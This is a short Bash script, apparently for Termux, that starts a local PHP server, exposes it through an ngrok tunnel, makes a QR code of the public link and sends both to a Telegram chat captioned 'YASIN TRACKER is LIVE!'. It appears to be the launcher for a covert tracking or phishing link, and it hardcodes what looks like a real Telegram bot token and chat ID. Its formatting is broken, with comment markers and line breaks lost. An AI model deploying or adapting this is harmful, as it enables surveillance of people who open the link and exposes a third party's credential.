#!/bin/bash

====== Configuration ======

BOT_TOKEN="8128619794:AAGhkVx-64tgJeoSXB_VDSQk7LnZaOECJcI" CHAT_ID="5548654620" PORT=8888

====== Install dependencies ======

echo "[+] Installing dependencies..." pkg update -y > /dev/null pkg install php curl jq termux-api unzip qrencode -y > /dev/null

====== Start PHP server ======

echo "[+] Starting local PHP server..." nohup php -S 127.0.0.1:$PORT > /dev/null 2>&1 & sleep 3

====== Start ngrok tunnel ======

echo "[+] Starting ngrok tunnel..." nohup ngrok http $PORT > /dev/null 2>&1 & sleep 5

====== Fetch ngrok URL ======

NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[] | select(.proto=="https") | .public_url')

if [[ -z "$NGROK_URL" ]]; then echo "[!] Failed to retrieve ngrok URL." exit 1 fi

echo "[+] Ngrok URL: $NGROK_URL"

====== Generate QR code ======

echo "[+] Generating QR Code..." echo "$NGROK_URL" | qrencode -o qr.png

====== Send to Telegram ======

echo "[+] Sending QR and URL to Telegram..." curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto" 
-F chat_id="$CHAT_ID" 
-F photo="@qr.png" 
-F caption="YASIN TRACKER is LIVE!\n\n$NGROK_URL"

echo "[+] DONE. Link and QR Code sent via Telegram."
